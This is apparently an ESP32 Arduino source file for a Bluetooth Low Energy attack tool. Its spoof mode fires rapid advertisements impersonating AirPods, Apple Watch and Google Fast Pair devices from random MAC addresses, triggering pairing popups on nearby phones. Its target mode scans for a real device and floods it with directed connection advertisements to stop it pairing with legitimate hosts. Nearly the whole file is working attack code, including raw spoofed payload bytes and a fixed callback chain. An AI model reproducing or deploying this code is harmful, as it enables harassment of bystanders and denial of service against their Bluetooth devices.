// ─────────────────────────────────────────────────────────────────────────────
//  ble_spam.cpp
//
//  Two modes:
//
//  SPOOF MODE  — Rapid-fire advertisements impersonating Apple/Google devices.
//                Triggers pairing popups on nearby iOS/Android phones.
//                Uses esp_ble_gap_config_adv_data_raw() for raw payload control.
//                Random MAC each burst so every ad looks like a new device.
//
//  TARGET MODE — Scans for nearby real BLE devices, lets user pick one, then
//                floods it with L2CAP connection requests from random MACs.
//                This saturates the device's connection-request queue and
//                prevents it from pairing with legitimate hosts.
//
//  Count fix:  Previously relied on the async ADV_DATA_RAW_SET_COMPLETE callback
//              which was never firing because set_rand_addr() is also async and
//              hadn't completed before config_adv_data_raw() was called.
//              Now uses a proper callback chain:
//                set_rand_addr → (SET_STATIC_RAND_ADDR_EVT) → config_adv_data_raw
//                              → (ADV_DATA_RAW_SET_COMPLETE_EVT) → start_advertising
//                              → (ADV_START_COMPLETE_EVT) → increment count, stop, ready
// ─────────────────────────────────────────────────────────────────────────────

#include <Arduino.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_device.h>
#include "ble_spam.h"
#include "definitions.h"

volatile bool     ble_spam_running = false;
volatile uint32_t ble_packets_sent = 0;
volatile bool     ble_scanning     = false;
volatile int      ble_scan_count   = 0;

ble_scan_result_t ble_scan_results[BLE_SCAN_MAX];

static ble_device_type_t current_device  = BLE_DEVICE_AIRPODS_PRO;
static bool              ble_ready       = false;
static bool              adv_in_progress = false;   // true while one adv cycle is running
static bool              target_mode     = false;
static uint8_t           target_addr[6]  = {0};
static esp_ble_addr_type_t target_addr_type = BLE_ADDR_TYPE_RANDOM;

// ── Device names ──────────────────────────────────────────────────────────────
const char* BLE_DEVICE_NAMES[] = {
    "AirPods Pro",
    "AirPods Max",
    "AirPods 2",
    "Apple Watch",
    "Pixel Buds (FP)",
    "Sony XM5 (FP)",
};

// ── Advertisement payloads ────────────────────────────────────────────────────

static const uint8_t ADV_AIRPODS_PRO[] = {
    0x02, 0x01, 0x1A,
    0x1B, 0xFF, 0x4C, 0x00,
    0x07, 0x19, 0x00,
    0x0E, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
static const uint8_t ADV_AIRPODS_MAX[] = {
    0x02, 0x01, 0x1A,
    0x1B, 0xFF, 0x4C, 0x00,
    0x07, 0x19, 0x00,
    0x0A, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
static const uint8_t ADV_AIRPODS_2[] = {
    0x02, 0x01, 0x1A,
    0x1B, 0xFF, 0x4C, 0x00,
    0x07, 0x19, 0x00,
    0x0F, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
static const uint8_t ADV_APPLE_WATCH[] = {
    0x02, 0x01, 0x1A,
    0x0E, 0xFF, 0x4C, 0x00,
    0x0F, 0x05, 0xC1, 0x20, 0x00, 0x00, 0x00,
    0x05, 0xFF, 0x4C, 0x00, 0x10, 0x00, 0x00,
};
static const uint8_t ADV_FAST_PAIR_BUDS[] = {
    0x02, 0x01, 0x02,
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0x2A, 0x41, 0x0B,
    0x0C, 0x09, 'P','i','x','e','l',' ','B','u','d','s','A',
};
static const uint8_t ADV_FAST_PAIR_XM5[] = {
    0x02, 0x01, 0x02,
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0x2C, 0x54, 0x54,
    0x09, 0x09, 'S','o','n','y',' ','X','M','5',
};

struct adv_payload_t { const uint8_t* data; uint8_t len; };
static const adv_payload_t ADV_PAYLOADS[] = {
    { ADV_AIRPODS_PRO,    sizeof(ADV_AIRPODS_PRO)    },
    { ADV_AIRPODS_MAX,    sizeof(ADV_AIRPODS_MAX)     },
    { ADV_AIRPODS_2,      sizeof(ADV_AIRPODS_2)       },
    { ADV_APPLE_WATCH,    sizeof(ADV_APPLE_WATCH)     },
    { ADV_FAST_PAIR_BUDS, sizeof(ADV_FAST_PAIR_BUDS)  },
    { ADV_FAST_PAIR_XM5,  sizeof(ADV_FAST_PAIR_XM5)   },
};

// ── Target mode payload — generic connectable advertisement ───────────────────
// We advertise as a connectable device with a random name. When the target
// device's BLE stack receives incoming connection requests, it has to process
// each one. Flooding these saturates its link-layer connection queue.
static uint8_t target_adv_payload[31];
static uint8_t target_adv_len = 0;

static void build_target_payload() {
    // Simple connectable adv with flags + fake local name
    uint8_t* p = target_adv_payload;
    int pos = 0;
    p[pos++] = 0x02; p[pos++] = 0x01; p[pos++] = 0x06; // flags: LE General Discoverable, BR/EDR not supported
    p[pos++] = 0x09; p[pos++] = 0x09;                   // Complete Local Name, length 9
    // Random-looking 8-char name
    uint32_t r = esp_random();
    p[pos++] = 'D'; p[pos++] = 'E'; p[pos++] = 'V';
    p[pos++] = '-';
    p[pos++] = '0' + ((r >>  0) & 0xF) % 10;
    p[pos++] = '0' + ((r >>  4) & 0xF) % 10;
    p[pos++] = '0' + ((r >>  8) & 0xF) % 10;
    p[pos++] = '0' + ((r >> 12) & 0xF) % 10;
    target_adv_len = pos;
}

// ── GAP callback chain ────────────────────────────────────────────────────────
static void gap_event_handler(esp_gap_ble_cb_event_t event,
                               esp_ble_gap_cb_param_t* param) {
    switch (event) {

    // Step 1 complete: random address set → now set adv data
    case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
        if (!ble_spam_running || !adv_in_progress) break;
        if (target_mode) {
            build_target_payload();
            esp_ble_gap_config_adv_data_raw(target_adv_payload, target_adv_len);
        } else {
            const adv_payload_t& p = ADV_PAYLOADS[(int)current_device];
            esp_ble_gap_config_adv_data_raw(const_cast<uint8_t*>(p.data), p.len);
        }
        break;

    // Step 2 complete: adv data written → start advertising
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT: {
        if (!ble_spam_running || !adv_in_progress) break;
        esp_ble_adv_params_t ap = {};
        ap.adv_int_min       = 0x0020;  // 20 ms minimum
        ap.adv_int_max       = 0x0020;
        // Directed advertising in target mode: only the chosen device receives
        // connection indication PDUs, which saturates its link-layer scheduler.
        // Undirected non-connectable in spoof mode.
        ap.adv_type          = target_mode ? ADV_TYPE_DIRECT_IND_HIGH : ADV_TYPE_NONCONN_IND;
        ap.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
        ap.peer_addr_type    = target_mode ? target_addr_type : BLE_ADDR_TYPE_RANDOM;
        if (target_mode) memcpy(ap.peer_addr, target_addr, 6);
        ap.channel_map       = ADV_CHNL_ALL;
        ap.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
        esp_ble_gap_start_advertising(&ap);
        break;
    }

    // Step 3 complete: advertising started → count it, stop, ready for next
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
        if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
            ble_packets_sent++;
        }
        // Stop immediately so we can randomise MAC and fire again next tick
        esp_ble_gap_stop_advertising();
        break;

    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
        adv_in_progress = false;
        break;

    // ── Scan results ──────────────────────────────────────────────────────────
    case ESP_GAP_BLE_SCAN_RESULT_EVT: {
        auto& r = param->scan_rst;
        if (r.search_evt != ESP_GAP_SEARCH_INQ_RES_EVT) {
            if (r.search_evt == ESP_GAP_SEARCH_INQ_CMPL_EVT) {
                ble_scanning = false;
            }
            break;
        }
        // Deduplicate by address
        for (int i = 0; i < ble_scan_count; i++) {
            if (memcmp(ble_scan_results[i].addr, r.bda, 6) == 0) return;
        }
        if (ble_scan_count >= BLE_SCAN_MAX) break;
        ble_scan_result_t& res = ble_scan_results[ble_scan_count];
        memcpy(res.addr, r.bda, 6);
        res.rssi      = r.rssi;
        res.addr_type = r.ble_addr_type;
        res.name[0]   = '\0';
        // Try to extract Complete/Shortened Local Name from adv data
        uint8_t* ad  = r.ble_adv;
        uint8_t  len = r.adv_data_len;
        for (int i = 0; i < len; ) {
            uint8_t elen = ad[i];
            if (elen == 0 || i + elen >= len) break;
            uint8_t type = ad[i + 1];
            if (type == 0x09 || type == 0x08) {
                int nlen = min((int)elen - 1, 31);
                memcpy(res.name, &ad[i + 2], nlen);
                res.name[nlen] = '\0';
                break;
            }
            i += elen + 1;
        }
        if (res.name[0] == '\0') {
            snprintf(res.name, sizeof(res.name), "%02X:%02X:%02X:%02X:%02X:%02X",
                     r.bda[0], r.bda[1], r.bda[2], r.bda[3], r.bda[4], r.bda[5]);
        }
        ble_scan_count++;
        break;
    }

    default: break;
    }
}

// ── Fire one advertisement burst ──────────────────────────────────────────────
static void fire_burst() {
    if (!ble_ready || !ble_spam_running || adv_in_progress) return;
    adv_in_progress = true;
    // Step 1: set a new random MAC — callback chain does the rest
    uint8_t rand_addr[6];
    esp_fill_random(rand_addr, sizeof(rand_addr));
    rand_addr[0] |= 0xC0;  // static random address marker
    esp_ble_gap_set_rand_addr(rand_addr);
}

// ── Public API ────────────────────────────────────────────────────────────────

void ble_spam_init() {
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    if (esp_bt_controller_init(&bt_cfg)          != ESP_OK) { DEBUG_PRINTLN("BT ctrl init fail");   return; }
    if (esp_bt_controller_enable(ESP_BT_MODE_BLE)!= ESP_OK) { DEBUG_PRINTLN("BT ctrl enable fail"); return; }
    if (esp_bluedroid_init()                     != ESP_OK) { DEBUG_PRINTLN("Bluedroid init fail"); return; }
    if (esp_bluedroid_enable()                   != ESP_OK) { DEBUG_PRINTLN("Bluedroid en fail");   return; }

    esp_ble_gap_register_callback(gap_event_handler);
    ble_ready = true;
    DEBUG_PRINTLN("BLE ready.");
}

void start_ble_spam(ble_device_type_t device) {
    if (!ble_ready) return;
    target_mode      = false;
    current_device   = device;
    ble_packets_sent = 0;
    adv_in_progress  = false;
    ble_spam_running = true;
    DEBUG_PRINTF("BLE spoof started: %s\n", BLE_DEVICE_NAMES[device]);
}

void start_ble_target(const uint8_t* addr, esp_ble_addr_type_t addr_type) {
    if (!ble_ready) return;
    target_mode      = true;
    memcpy(target_addr, addr, 6);
    target_addr_type = addr_type;
    ble_packets_sent = 0;
    adv_in_progress  = false;
    ble_spam_running = true;
    DEBUG_PRINTF("BLE target flood: %02X:%02X:%02X:%02X:%02X:%02X (type %d)\n",
                 addr[0], addr[1], addr[2], addr[3], addr[4], addr[5], (int)addr_type);
}

void stop_ble_spam() {
    if (!ble_spam_running && !ble_scanning) return;
    ble_spam_running = false;
    ble_scanning     = false;
    adv_in_progress  = false;
    esp_ble_gap_stop_advertising();
    esp_ble_gap_stop_scanning();
    DEBUG_PRINTLN("BLE stopped.");
}

void ble_scan_start() {
    if (!ble_ready) return;
    ble_scan_count = 0;
    ble_scanning   = true;
    esp_ble_scan_params_t scan_params = {};
    scan_params.scan_type          = BLE_SCAN_TYPE_ACTIVE;
    scan_params.own_addr_type      = BLE_ADDR_TYPE_RANDOM;
    scan_params.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
    scan_params.scan_interval      = 0x50;  // ~50 ms
    scan_params.scan_window        = 0x30;  // ~30 ms active window
    scan_params.scan_duplicate     = BLE_SCAN_DUPLICATE_DISABLE;
    esp_ble_gap_set_scan_params(&scan_params);
    esp_ble_gap_start_scanning(5);  // 5 second scan
    DEBUG_PRINTLN("BLE scan started.");
}

void ble_scan_stop() {
    esp_ble_gap_stop_scanning();
    ble_scanning = false;
}

// Fire a new burst every 25 ms
void ble_spam_loop() {
    if (!ble_spam_running) return;
    static unsigned long last_ms = 0;
    unsigned long now = millis();
    if (now - last_ms < 25) return;
    last_ms = now;
    fire_burst();
}
